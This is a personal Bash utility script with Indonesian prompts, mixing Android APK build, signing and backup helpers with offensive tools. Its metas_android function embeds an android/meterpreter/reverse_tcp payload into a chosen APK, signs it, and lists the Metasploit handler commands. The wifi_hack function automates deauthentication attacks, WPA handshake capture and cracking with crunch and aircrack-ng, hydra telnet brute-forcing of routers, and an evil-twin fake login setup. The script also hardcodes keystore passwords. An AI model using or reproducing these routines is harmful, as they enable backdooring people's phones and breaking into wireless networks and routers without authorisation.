#!/bin/bash

#Colors vars
green_color="\033[1;32m"
green_color_title="\033[0;32m"
red_color="\033[1;31m"
red_color_slim="\033[0;031m"
blue_color="\033[1;34m"
cyan_color="\033[1;36m"
brown_color="\033[0;33m"
yellow_color="\033[1;33m"
pink_color="\033[1;35m"
white_color="\e[1;97m"
normal_color="\e[1;0m"
reset_color="\033[0m"

#Data path
com="$@" #var sensitif
allib="/usr/lib/allib"
apkkeyC="0"
apkkeyB="0"
pauto="$allib/build-tools/auto"
path_apk_empeded="$HOME/oprek/smali"
path_apk_backup="$HOME/Dokumen/android"
lib_apk_backup="$allib/build-tools"
default_apk_build="$allib/build-tools/main"
ndk="/home/jin/android-ndk-r21b" #DON'T use ~/android-ndk-r20b
#Distros vars
known_compatible_distros=(
                            "Wifislax"
                            "Kali"
                            "Parrot"
                            "Backbox"
                            "BlackArch"
                            "Cyborg"
                            "Ubuntu"
                            "Debian"
                            "SuSE"
                            "CentOS"
                            "Gentoo"
                            "Fedora"
                            "Red Hat"
                            "Arch"
                            "OpenMandriva"
                        )

#Tools vars
essential_tools_names=(
                        "ifconfig"
                        "iwconfig"
                        "iw"
                        "awk"
                        "airmon-ng"
                        "airodump-ng"
                        "aircrack-ng"
                        "xterm"
                        "apktool"
                        "adb"
                        "fastboot"
                        "java"
                        "javac"
                        "unzip"
                        "apache2"
                        "mysql"
                    )
declare -A possible_package_names=(
                                    [${essential_tools_names[0]}]="net-tools" #ifconfig
                                    [${essential_tools_names[1]}]="wireless-tools / wireless_tools" #iwconfig
                                    [${essential_tools_names[2]}]="iw" #iw
                                    [${essential_tools_names[3]}]="awk / gawk" #awk
                                    [${essential_tools_names[4]}]="aircrack-ng" #airmon-ng
                                    [${essential_tools_names[5]}]="aircrack-ng" #airodump-ng
                                    [${essential_tools_names[6]}]="aircrack-ng" #aircrack-ng
                                    [${essential_tools_names[7]}]="xterm" #xterm
                                    [${essential_tools_names[8]}]="apktool"
                                    [${essential_tools_names[9]}]="adb"
                                    [${essential_tools_names[10]}]="fastboot"
                                    [${essential_tools_names[11]}]="openjdk-8-jdk-headless"
                                    [${essential_tools_names[12]}]="openjdk-8-jdk-headless"
                                    [${essential_tools_names[13]}]="unzip"
                                    [${essential_tools_names[14]}]="apache2"
                                    [${essential_tools_names[15]}]="mysql"
                                )


function last_echo() {
    echo -e "${2}$*${normal_color}"
}
function echo_green() {
    last_echo "${1}" "${green_color}"
}
function echo_blue() {
    last_echo "${1}" "${blue_color}"
}
function echo_yellow() {
    last_echo "${1}" "${yellow_color}"
}
function echo_red() {
    last_echo "${1}" "${red_color}"
}
function echo_red_slim() {
    last_echo "${1}" "${red_color_slim}"
}
function echo_green_title() {
    last_echo "${1}" "${green_color_title}"
}
function echo_pink() {
    last_echo "${1}" "${pink_color}"
}
function echo_cyan() {
    last_echo "${1}" "${cyan_color}"
}
function echo_brown() {
    last_echo "${1}" "${brown_color}"
}
function echo_white() {
    last_echo "${1}" "${white_color}"
}
#Generate a small time loop printing some dots
function time_loop() {
    echo -ne " "
    for (( j=1; j<=4; j++ )); do
        echo -ne "."
        sleep 0.035
    done
}
function spinner()
{
    local pid=$!
    local delay=0.05
    local spinstr='|/-\'
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

function apk_classToDex() {
    read -p "[+] Nama class: " classNama
    bash $allib/build-tools/dx --dex --output=classes.dex $classNama
    baksmali classes.dex
}
function apk_sign() {
    read -p "[+]  Masukan nama apk: " snapk
    echo "[+]  signing ..."
    jarsigner -verbose -keystore $allib/sign/shun.keystore -storepass "#pesawat" -keypass "#pesawat" -digestalg SHA1 -sigalg MD5withRSA $snapk mykey & spinner
    ls
}
#mengubah class ke java
function apk_vclass() {
    vclass=$allib/vclasslib
    ls
    read -p "[+]  Path/Singgle? p/s: " pvclass

    if [ "$pvclass" = "p" ]; then
        files=( * )
        for vcpath in "${files[@]}"; do
            if [ -d "$vcpath" ]; then
                echo_pink "$vcpath"
            fi
        done
        read -p "[+]  Nama path: " npath
        cd "$npath"

        find . -name "*.class" -print0 | while read -d $'\0' file
        do
            echo -ne "$file : "
            java -jar $vclass/lib1.jar "$file" > $file".java" & spinner
            echo
            rm "$file"
        done
    else
        echo
        ls
        read -p "[+]  Nama class: " vcapk
        java -jar $vclass/lib1.jar "$vcapk" > $vcapk".java" & spinner
        cat $vcapk".java"
    fi
}

function apk_build()
{
    if [ $apkkeyC = "1" ]; then
        export LIBPROJ=$allib/build-tools
        anama=`cat $pauto/nama.txt`
        apaket=`cat $pauto/paket.txt`
        cd $LIBPROJ
        sudo chmod 777 -R $anama
        if [ ! -d "$anama/obj" ]; then mkdir $anama/obj; fi
        if [ ! -d "$anama/bin" ]; then mkdir $anam/bin; fi

        rlagi="y"
        while [ $rlagi = "y" ];do
            read -p $'\e[31m(ApkkeyC)\e[0m buat R? y/n: ' R

            if [ "$R" = "y" ]; then 
                echo_yellow  "[+]  Buat file R.java --->>"
                ./aapt package -f -m -J $anama/src -M $anama/AndroidManifest.xml -S $anama/res -I $LIBPROJ/android.jar
                echo
            else
                rlagi="n"
            fi
        done
        cd $anama

        clagi="y"
        while [ $clagi = "y" ]; do
            read -p $'\e[31m(ApkkeyC)\e[0m compile? y/n: ' EPROJ

            if [ "$EPROJ" = "y" ]; then
                echo_yellow "###################### `date` #######################"
                echo_green_title "Compiling..."

                #this javac 8
                #javac -d obj -classpath src -bootclasspath $LIBPROJ/android.jar src/$apaket/*.java &
                
                javac -d obj -source 1.7 -target 1.7 -classpath src -bootclasspath $LIBPROJ/android.jar src/$apaket/*.java &
                spinner
                
                echo_red "Finish compiling!"
            else
                clagi="n"
            fi
        done

        cclagi="y"
        while [ $cclagi = "y" ]; do
            if [ -d jni ]; then
                read -p $'\e[31m(ApkkeyC)\e[0m jni compile y/n: ' jnicompile
            else
                cclagi="n"
            fi
            if [ "$jnicompile" = "y" ]; then
                $ndk/ndk-build
                if [ ! -d lib ]; then
                    mkdir lib
                fi
                rm -R lib/*
                mv libs/* lib
                rm -r libs
            else
                cclagi="n"
            fi
        done
    
        cd $LIBPROJ
        echo
        echo_blue "[+]  Dexing -->> ";./dx --dex --output=$anama/bin/classes.dex $anama/obj >/dev/null & spinner
        echo_yellow "[+]  Build apk -->> ";./aapt package -f -m -F $anama/bin/out.apk -A $anama/assets -M $anama/AndroidManifest.xml -S $anama/res -I $LIBPROJ/android.jar >/dev/null & spinner
        cp $anama/bin/classes.dex .
        ./aapt add $anama/bin/out.apk classes.dex  >/dev/null
        ./aapt list $anama/bin/out.apk  >/dev/null

        if [ -d $anama/jni ]; then
            cd $anama
            files=( lib/* )
            for file in "${files[@]}"; do
                pjni="`printf $file`"
                ejni="`ls $file`"
                ejni=$pjni/$ejni
                aapt add bin/out.apk $ejni
            done
            cd -
        fi
        echo_green  "[+]  Signing apk -->>"; jarsigner -verbose -keystore $allib/sign/shun.keystore -storepass "#pesawat" -keypass "#pesawat" -digestalg SHA1 -sigalg MD5withRSA $anama/bin/out.apk mykey  >/dev/null & spinner
        echo ""
        echo ""
        echo_yellow "###### SUKSES ######"
        echo "path   : $anama/bin/out.apk"; echo
        read -p $'\e[31m(ApkkeyC)\e[0m Install? y/n : ' ins

        if [ "$ins" = "y" ]; then
            spbapk=($(echo "$pbapk" | tr '/' '\n'))
            for i in "${!spbapk[@]}"; do
                echo -ne "${spbapk[i]}."
            done
            echo ""
            read -p $'\e[31m(ApkkeyC)\e[0m masukan paket (com.sample) : ' tpbapk
            read -p $'\e[31m(ApkkeyC)\e[0m masukan activity (MainActivity): ' tabapk
            echo_red "[+]  uninstall"
            adb uninstall "$tpbapk" & spinner
            echo_red "[+]  install"
            adb install "$anama/bin/out.apk" & spinner
            adb shell am start -n $tpbapk/$tpbapk.$tabapk
        fi
        read -p $'\e[31m(ApkkeyC)\e[0m EXIT? y/n : ' keluar
        if [ "$keluar" = "y" ]; then
            echo "good bay"
            exit
        fi
        anama=""
        apaket=""
        apk_build
    fi

    if [ $apkkeyB = "1" ]; then
        abnama=`cat $pauto/nama.txt`
        abpaket=`cat $pauto/paket.txt`

        mkdir $abnama; cd $abnama
        mkdir -p src/$abpaket; mkdir assets
        mkdir obj; mkdir bin; mkdir -p res/layout
        mkdir res/values; mkdir res/drawable

        read -p $'\e[31m(ApkkeyC)\e[0m Build C ndk code? y/n: ' bndk

        if [ "$bndk" = "y" ]; then
            mkdir lib
            cp -r $default_apk_build/jni `pwd`
        fi
        cat $default_apk_build/AndroidManifest.xml > AndroidManifest.xml
        cat $default_apk_build/MainActivity.java > src/$abpaket/MainActivity.java
        cat $default_apk_build/strings.xml > res/values/strings.xml
        cat $default_apk_build/main.xml > res/layout/main.xml
        cat $default_apk_build/styles.xml > res/values/styles.xml
        echo "project dibuat"
        exit
    fi
}
#untuk backup apk via usb adb am make
function apk_backup()
{
    if [ ! -d $path_apk_backup"/apk" ]; then
        echo "[+] Membuat folder Apk...";
        mkdir -p $path_apk_backup"/apk"
    fi
    if [ ! -d $path_apk_backup"/cache" ]; then
        echo "[+] Membuat folder Cache...";
        mkdir -p $path_apk_backup"/cache"
    fi

    read -p "[+]  Cache atau Apk c/a? : " apkb
    if [ "$apkb" = "a" ]; then
        
        cd $allib/build-tools
        if [ -z "$1" ]; then
            echo "Anda harus lulus paket untuk fungsi ini"
            echo "Ex: apk_backup_apk \"com.android.contacts\""
            return 1
        fi
        if [ -z "$(./adb shell pm list packages | grep $1)" ]; then
            echo "invalid packet list!"
            return 1
        fi
        apk_path="`./adb shell pm path $1 | sed -e 's/package://g' | tr '\n' ' ' | tr -d '[:space:]'`"
        apk_name="`basename ${apk_path} | tr '\n' ' ' | tr -d '[:space:]'`"
        destination=$path_apk_backup"/apk"
        ./adb pull ${apk_path} ${destination}
        echo -e "\nAPK simpan di $destination/$paket"
        cd "$destination"
        mv $apk_name $paket".apk"
        chmod 777 $paket".apk"
    else
        
        cd $lib_apk_backup
        if [ -z "$1" ]; then
            echo "Anda harus lulus paket untuk fungsi ini"
            echo "Ex: apk_backup_apk \"com.android.contacts\""
            return 1
        fi
        if [ -z "$(./adb shell pm list packages | grep $1)" ]; then
            echo "invalid packet list!"
            return 1
        fi
        apk_path="`./adb shell pm path $1 | sed -e 's/package://g' | tr '\n' ' ' | tr -d '[:space:]'`"
        apk_name="`basename ${apk_path} | tr '\n' ' ' | tr -d '[:space:]'`"
        destination=$path_apk_backup"/cache"

        read -p "[+]  backup atau kembalikan cache:  b/k : " rest
        if [ "$rest" = "b" ]; then
            ./adb backup -f /tmp/$paket".ab" $paket
            mv "/tmp/$paket".ab $destination
            echo -e "\nCache APK tersimpan $destination"
        fi
        if [ "$rest" = "k" ]; then
            read -p "Yakin mau KEMBALIKAN? y/t: " alert
            if [ "$alert" = "y" ]; then
                ls -l $destination
                read -p "Masukan ab file: " abf
                ./adb restore "$destination/$abf"
            fi
        fi
    fi
}
#bongkar apk hasil smali code dan class
function apk_empeded() {
    if [ ! -d $path_apk_empeded ]; then
        echo "[+]  Membuat folder Empeded..."
        mkdir -p $path_apk_empeded
    fi
    read -p "[+]  Decompile, Compile, Backdoor d/c/b? : " apkdc

    if [ "$apkdc" = "d" ]; then
        read -p "[+]  Semua atau jar s/j? : " dapk
        if [ $dapk = "s" ]; then
            echo "-->> Nama apk [tanpa tanda petik biarkan spasi]"
            ls
            read -p "[+]  Nama apk: " dnapk
            vclass=$allib/vclasslib

            control=`ls $path_apk_empeded | grep "$dnapk"`
            read -p "[+]  Apakah $dnapk y/n: " tesdnapk

            if [ "$control" = "$dnapk" ]; then
                read -p "[+]  file sudah ada ganti? y/t : " g
                if [ "$g" = "y" ]; then
                    rm -R "$path_apk_empeded/$dnapk"
                    apk_empeded
                fi
            elif [ "$tesdnapk" = "n" ]; then
                apk_empeded
            elif [ "$dnapk" = "" ]; then
                echo "Error: nama kosong"
                apk_empeded
            else
                mkdir "$path_apk_empeded/$dnapk"
                cp "$dnapk" "$path_apk_empeded/$dnapk"
                cd "$path_apk_empeded/$dnapk"
                apktool d "$dnapk"
                mkdir java
                mv "$dnapk" java
                cd java
                echo "[+]  dex to class"
                bash $allib/dex2jar/d2j-dex2jar.sh "$dnapk"
                find_jar=`ls | grep *.jar`
                a=`unzip "$find_jar"`
                at=($(echo "$a" | tr ':' '\n'))

                read -p "Apakah semua class mau diubah ke java? y/t: " jcontrol

                for i in "${!at[@]}"; do
                    if [ "$jcontrol" = "y" ]; then
                        if [ ${at[i]} = "inflating" ]; then
                            jsplit=($(echo "${at[i+1]}" | tr '.' '\n'))
                            echo "[+] $jsplit".java
                            java -jar $vclass/lib1.jar "${at[i+1]}" > $jsplit".java"
                        elif [ ${at[i]} = "creating" ]; then
                            folder="${at[i+1]}"
                            echo ""
                            echo "[=] proses di folder: $folder"
                        fi
                    fi
                done
                echo "<<< tersimpan di  $path_apk_empeded/$dnapk >>"
            fi
        else 
            read -p "[+]  Nama jar/apk: " njdapk
            bash $allib/dex2jar/d2j-dex2jar.sh "$njdapk"
        fi

    elif [ "$apkdc" = "c" ]; then
        bash $allib/apktool/apktool b
        cd dist
        ncapk=`ls | grep "apk"`
        echo "[+] sign apk ...."
        jarsigner -verbose -keystore $allib/sign/shun.keystore -storepass "#pesawat" -keypass "#pesawat" -digestalg SHA1 -sigalg MD5withRSA $ncapk mykey  >/dev/null
        read -p "[+] Install y/n : " icapk
        if [ "$icapk" != "" ]; then
                    adb install  $ncapk
        fi
        ls
    elif [ "$apkdc" = "b" ]; then
        read -p "[+]  Offline/Online? off/on" bpil

        if [ "$bpil" = "off" ]; then
            echo 
        fi
    fi
}

function git_manager() {
    echo
    echo_green_title "        GIT MANAGER"
    echo
    read -p "upload/clone? u/c: " git_m
    echo_pink "$git_m"

    if [ "$git_m" = "u" ]; then
        git init
        git add .
        read -p "[+]  Masukan commit: " comit
        git commit -m "$comit"
        read -p "[+]  Masukan http: " http
        git remote add origin "$http"
        git push -f origin main

    elif [ "$git_m" = "c" ]; then
        read -p "[+]  Masukan link: " git_url
        pwd
        git clone "$git_url"
    else
        echo_red "[!]  input git salah"
    fi
}

function metas_android() {
    #read -p "[+]  ruby apk-embed-payload.rb Instagram.apk -p android/meterpreter/reverse_tcp lhost=ipmu lport=1337"
    
    read -p "[+]  sisip nama apk ex-> myapp.apk: " metas_nama
    read -p "[+]  sisip ip local ex-> 10.42.0.1: " metas_ip
    ruby $allib/apk-embed/apk-embed-payload.rb "$metas_nama" -p "android/meterpreter/reverse_tcp lhost=$metas_ip lport=1337"

    read -p "[+]  signing? y/n: "
    jarsigner -verbose -keystore $allib/sign/shun.keystore -storepass "#pesawat" -keypass "#pesawat" -digestalg SHA1 -sigalg MD5withRSA $metas_nama mykey
    ls

    echo
    echo_red "next Usage: "
    echo "[ exploit ] msfconsole"
    echo "[ exploit ] use exploit/multi/handler"
    echo "[ exploit ] set payload android/meterpreter/reverse_tcp"
    echo "[ exploit ] set lhost ipmu"
    echo "[ exploit ] set lport 1337"
    echo "[ exploit ] exploit"
}

function cerah() {
    MAX=`cat /sys/class/backlight/intel_backlight/max_brightness`
    NOW=`cat /sys/class/backlight/intel_backlight/brightness`

    echo "-->> Maximal : [ $MAX ]"
    echo "-->> Sekarang : [ $NOW ]"
    echo 1500 > /sys/class/backlight/intel_backlight/brightness
    echo "-->> Default : [ 1500 ]"
    read -p "Masukan Kecerahan sekarang : " cer

    if [ "$cer" = "" ]; then
        echo "-->> Memakai default"
    else
        echo "$cer" > /sys/class/backlight/intel_backlight/brightness
        echo "[ $cer ]"
    fi
}

function install_data() {
    bashversion="${BASH_VERSINFO[0]}.${BASH_VERSINFO[1]}"

    # disto
    for i in "${known_compatible_distros[@]}"; do
        if uname -a | grep "${i}" -i > /dev/null; then
            distro="${i^}"
            break
        fi
    done

    echo_blue "Bash version: $bashversion"
    echo_blue "User        : `whoami`"
    echo_blue "Disto       : $distro"

    #cek tools
    essential_toolsok=1
    for i in "${essential_tools_names[@]}"; do
        echo -ne "${i}"
        time_loop
        if ! hash "${i}" 2> /dev/null; then
            echo -ne "${red_color} Error${normal_color}"
            essential_toolsok=0
            echo -ne " ${possible_package_names_text[${language}]}${possible_package_names[${i}]}"
            echo -e "\r"
        else
            echo -e "${green_color} Ok\r${normal_color}"
        fi
    done
    echo

    if [ ! -d $allib ]; then
        echo_red_slim "[!] Data allib kosong Enter untuk memindah"
        read -p "Enter"
        mv allib "/usr/lib/"
        chmod 777 -R "$allib"
        cp ai "/usr/bin"
        chmod 777 "/usr/bin"
    else
        read -p "Update data? y/n: " ins
        if [ "$ins" = "y" ]; then
            read -p "Enter"
            rm -R "$allib"
            mv allib "/usr/lib/"
            chmod 777 -R "$allib"
            cp ai "/usr/bin"
            chmod 777 "/usr/bin"
        fi
    fi

    echo_red "---server---"
    echo_blue "apt install libapache2-mod-php php-mysql php-common"
    echo_blue "service apache2 start"
    echo_blue "apt install mysql-server"
    echo_blue "mysql --version"
    echo_blue "service mysql start"
    echo_blue "apt install phpmyadmin"
    echo
    echo_red "---apk build---"
    echo_blue "apt install openjdk-8-jdk"
    echo_blue "apt install openjdk-8-jre"

}

function wifi() 
{
    read -p "[+] baru/lama/clien? y/l/c: " wi
    if [ "$wi" = "y" ]; then
        nmcli connection add type wifi ifname '*' con-name alice autoconnect no ssid "Server alice"
        nmcli connection modify alice 802-11-wireless.mode ap 802-11-wireless.band bg ipv4.method shared
        nmcli connection up alice
    elif [ "$wi" = "c" ]; then
        echo
        echo_green_title "****** List now *****"
        #sudo arp -a
        sudo nmap -sS 10.42.0.1/24
        echo
        echo "***** Name ******"
        cat "/var/lib/misc/dnsmasq.leases"
    else
        nmcli connection up alice
    fi
}

function nmap()
{
    echo "nmap -v -A -p22 192.168.50.1"
    echo "nmap -sV -p22 192.168.50.1"
}

function wifi_hack()
{
    echo
    echo_green_title "************* Wifi hack *****************"
    echo
    read -p $'\e[31m(Wifihack)\e[0m Evil/brute/router e/b/r? : ' wif

    wifsave="$HOME/Hack/wifi"
    wiftmp="/tmp/wifihacking"
    wifserver="$allib/fakelogin/tplink"

    if [ ! -d $wifsave ]; then
        mkdir -p $wifsave
    fi
    if [ ! -d $wiftmp ]; then
        mkdir -p $wiftmp
    fi

    if [ "$wif" = "r" ]; then
        read -p "[+]  Masukan interface telnet/ssh? t/s: " prout
        if [ "$prout" = "t" ]; then
            read -p "[+]  masukan file pass ex tes.txt: " ppass
            read -p "[+]  masukan file name ex tes.txt: " pname
            read -p "[+]  masukan server ex wifiku.web.id: " pser
            hydra -L "$pname" -P "$ppass" "$pser" telnet
        fi

    elif [ "$wif" = "e" ]; then
        airmon-ng start "$wifin"

        buatfakedns & buatserver
        fuser -n tcp -k 53 67 80 &
        fuser -n udp -k 53 67 80
        xterm -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout $wifsave/server.pem -out $wifsave/server.pem
        echo "############ sample ###############"
        echo "aireplay-ng -O O -a <ssid> -c <station> --ignore-negative-one mon0"
        read -p "[+] Nama Fake wifi : " wifen
        read -p "[+] Nama BSSID     : " wifeb
        echo "tunggu..."

    elif [ "$wif" = "b" ];then
        read -p "[+] online/offline? on/of : " wifb

        if [ "$wifb" = "on" ]; then
            echo
            iwconfig
            read -p $'\e[31m(Wifihack)\e[0m Interface Name ex wlan0: ' wifin
            read -p $'\e[31m(Wifihack)\e[0m Monitor Name ex mon0: ' wifimon
            airmon-ng start "$wifin"
            airodump-ng $wifimon

            read -p "[+] MAC address: " wifbmac
            read -p "[+] Nomor channel: " wifbch

            xterm -bg "#000000" -fg "#00AA00" -title "Monitor client" -e airodump-ng -c "$wifbch" --bssid "$wifbmac" -w $wiftmp/hand "$wifimon" 2>/dev/null &
            
            wklagi="y"
            while [ $wklagi = "y" ]; do
                read -p $'\e[31m(Wifihack)\e[0m Kill lagi? y/n: ' klagi

                if [ "$klagi" = "y" ]; then
                    xterm -bg "#000000" -fg "#FF00A4" -title "Kill" -e aireplay-ng --deauth 5 -a "$wifbmac" --ignore-negative-one "$wifimon" 2>/dev/null &
                else
                    wklagi="n"
                fi
            done

            read -p "[+] simpan handshakes? y/n : " wifbs
            if [ "$wifbs" = "y" ]; then
                read -p "[+] Nama handsake : " wifbsn
                cd $wifsave; mkdir "$wifbsn"
                cp $wiftmp/* "$wifbsn"
            else
                echo "[+] remove all handsake"
                rm $wiftmp/*
            fi
            airmon-ng stop "$wifimon"

            read -p "[+] Punya Wordlist? y/n: " wifbwp
            if [ "$wifbwp" = "n" ]; then
                echo
                echo_pink "*** Jangan ada spasi ****"
                echo_blue "**** ini menggunakan kombinasi crunch dan aircrack-ng ****"
                read -p "[+] Panjang pertama: " pertama
                read -p "[+] Panjang terakhir: " terakhir
                read -p "[+] Kombi Huruf: " huruf
                read -p "[+] Nama Wifi: " namawifi

                crunch $pertama $terakhir "$huruf" --stdout | aircrack-ng -w- $wiftmp/*.cap -e "$namawifi"
            else
                ls
                read -p "[+] ~ Nama file Wordlist word.lst: " wifbw
                aircrack-ng -w $wifbw -b $wifbmac $wiftmp/*.cap
            fi

        elif [ "$wifb" = "of" ]; then
            read -p "[+] Punya Wordlist? y/n: " wifbwp
            if [ "$wifbwp" = "n" ]; then
                echo
                echo_pink "*** Jangan ada spasi ****"
                echo_blue "**** ini menggunakan kombinasi crunch dan aircrack-ng ****"
                read -p "[+] Panjang pertama: " pertama
                read -p "[+] Panjang terakhir: " terakhir
                read -p "[+] Kombi Huruf: " huruf
                read -p "[+] Nama ESSID Wifi: " namawifi

                ls $wifsave
                read -p "[+] Nama handsake wifi : " wifbh
                crunch $pertama $terakhir "$huruf" --stdout | aircrack-ng -w- $wifsave/$wifbh/*.cap -e "$namawifi"
            else
                ls
                read -p "[+] ~ Nama Wordlist *.txt : " wifbw
                ls $wifsave
                read -p "[+] Nama wifi : " wifbh
                aircrack-ng -w $wifbw $wifsave/$wifbh/*.cap
            fi
        else
            echo "Wifi input error"
        fi
    fi
}


function apk_index() {
    echo
    echo_green_title "        APK INDEX"
    echo
    echo_green_title "Select an option from menu:"

    echo_blue "---------"
    echo_pink "1.  Build android apk"
    echo_pink "2.  Empeded android app decompile/compile"
    echo_pink "3.  Sign manually android app"
    echo_pink "4.  View class to java code"
    echo_pink "5.  Backup android app"
    echo_pink "6.  Adb touch"
    echo_pink "7.  Apk class to dex"
    echo_pink "8.  Android metasploit tutor"

    read -rp "> " apk_option
    case ${apk_option} in
    0)
        echo_red "[?] Exit script"
    ;;
    1)
        if ! hash "java" 2> /dev/null; then
            echo
            echo -ne "${red_color}         Error java not installed ${normal_color}"
            echo
            exit
        else
            if [ ! -d $pauto ]; then
                echo "[+] Membuat folder apkkey temp...";
                mkdir -p $pauto
            fi
            echo
            echo
            echo_green_title "*** Android build ***"
            echo_blue "----------"
            echo_pink "1.  Compile apk"
            echo_pink "2.  Build apk"
            read -p "> " mindex
            ls;echo
            if [ "$mindex" = "1" ]; then
                read -p $'\e[31m(ApkkeyC)\e[0m Masukan nama? coba: ' anama

                if [ "`find $anama/AndroidManifest.xml`" != "" ]; then
                    cat "$anama/"AndroidManifest.xml
                    echo ""
                    apkbu_paket=`cat "$anama/"AndroidManifest.xml | grep package`
                    echo_green $apkbu_paket
                    echo
                fi

                read -p $'\e[31m(ApkkeyC)\e[0m Masukan paket? com/coba: ' apaket

                echo "$apaket" > $pauto/paket.txt
                echo `pwd`/"$anama" > $pauto/nama.txt
                apkkeyC="1"
                apk_build
            elif [ "$mindex" = "2" ]; then
                read -p $'\e[31m(ApkkeyB)\e[0m Masukan nama? coba: ' anama
                read -p $'\e[31m(ApkkeyB)\e[0m Masukan paket? com/coba: ' apaket

                echo "$apaket" > $pauto/paket.txt
                echo `pwd`/"$anama" > $pauto/nama.txt
                apkkeyB="1"
                apk_build
            fi
        fi
    ;;
    2)
        if ! hash "java" 2> /dev/null; then
            echo
            echo -ne "${red_color}         Error java not installed ${normal_color}"
            echo
            exit
        else
            apk_empeded
        fi
    ;;
    3)
        if ! hash "java" 2> /dev/null; then
            echo
            echo -ne "${red_color}         Error java not installed ${normal_color}"
            echo
            exit
        else
            apk_sign
        fi
    ;;
    4)
        if ! hash "java" 2> /dev/null; then
            echo
            echo -ne "${red_color}         Error java not installed ${normal_color}"
            echo
            exit
        else
            apk_vclass
        fi
    ;;
    5)
        lagi="y"
        while [ $lagi = "y" ]; do
            read -p "[+]  Masukan nama paket ENTER semua: " apknb
            apknr=""
            cd "$allib/build-tools"
            if [ "$apknb" = "" ]; then
                apknr=`./adb shell pm list packages`
            else
                apknr=`./adb shell pm list packages | grep "$apknb"`
            fi
            nspaket=($(echo "$apknr" | tr ':' '\n'))
            for i in "${!nspaket[@]}"; do
                if [ ${nspaket[i]} = "package" ]; then
                    jsplit=($(echo "${nspaket[i+1]}" | tr ':' '\n'))
                    echo "$jsplit"
                fi
            done
            read -p "[+]  Masukan backup package: " paket
            apk_backup $paket
            read -p "[+]  Lagi ? y/n : " lagi
        done
    ;;
    6)
        while [ true ]; do
            echo -n "."
            # home
            adb shell input keyevent 3
            sleep 1
            # phone key
            #adb shell input keyevent 5
            start launcher
            adb shell input tap 150 500
            sleep 1
        done
    ;;
    7)
        if ! hash "java" 2> /dev/null; then
            echo
            echo -ne "${red_color}         Error java not installed ${normal_color}"
            echo
            exit
        else
            apk_classToDex
        fi
    ;;
    8)
        metas_android
    ;;
    *)
        echo
        echo_red "[!] Input not found try again"
        read -p "Enter"
    ;;
    esac
}

function tes() {
    read -p "$(echo -e $yellow_color"foo $pink_color bar "$reset_color)" INPUT_VARIABLE
}



if [ "$com" = "apkkey" ]; then
    apk_index
elif [ "$com" = "git" ]; then
    git_manager
elif [ "$com" = "cerah" ]; then
    cerah
elif [ "$com" = "edit" ]; then
    cd $allib/sublime/62bit
    ./sublime_text 2>/dev/null &
elif [ "$com" = "3d" ]; then
    cd $allib/blender-2.75a-linux-glibc211-i686/
    ./blender 2>/dev/null &
elif [ "$com" = "wifi" ]; then
    wifi
elif [ "$com" = "rec" ]; then
    pacmd list-sinks | grep -e 'name:' -e 'index' -e 'Speakers'
    read -p "Masukan adapter: " adapter
    read -p "Nama file! out.mp3: " recnama
    parec -d "$adapter."monitor | lame -r -V0 - "$recnama"
elif [ "$com" = "wifi_hack" ]; then
    wifi_hack
elif [ "$com" = "install" ]; then
    install_data
elif [ "$com" = "screen" ]; then
    read -p "screenshoot/off/on? scr/off/on: " scrc
    if [ "$scrc" = "scr" ]; then
       scrot ~/screen.jpeg
    elif [ "$scrc" = "off" ]; then
       xset -display :0.0 dpms force off
    elif [ "$scrc" = "on" ]; then
       xset -display :0.0 dpms force on
    fi
elif [[ "$com" = "snap" ]]; then
    read -p "service disable? y/n: " snapp
    if [ "$snapp" = "y" ]; then
        set -x
        systemctl unmask snapd.service
        systemctl start snapd.service
        systemctl status --no-pager snapd.service
        snap refresh
        systemctl mask snapd.service
        systemctl stop snapd.service
        kill -9 $(pgrep snapd)
    fi
elif [ "$com" = "seven-square" ]; then
    cd $allib/build-tools
    ./seven-square
elif [ "$com" = "tes" ]; then
    #read -p $'\e[31mFoobar\e[0m: ' foo
    tes
else
    echo
    echo_green_title "    DAFTAR PERINTAH"
    echo
    echo_yellow "apkkey: manajer aplikasi android"
    echo_yellow "git: manajer git"
    echo_yellow "snap: manajer snap installer"
    echo_yellow "wifi: membuat wifi hotspot"
    echo_yellow "cerah: mengatur Kecerahan layar"
    echo_yellow "edit: membuka text editor"
    echo_yellow "3d: membuka blender 3d"
    echo_yellow "screen: screenshot window"
    echo_yellow "rec: merekam internal audio"
    echo_yellow "wifi_hack: mengetes wifi"
    echo_yellow "install: jika ini program diinstall dikomputer baru jalankan perintah ini"
    echo

fi

#iptables -A FORWARD -p udp --dport 53 -j ACCEPT
#iptables -A FORWARD -p udp --sport 53 -j ACCEPT
#iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination localhost:8080
#iptables -P FORWARD DROP
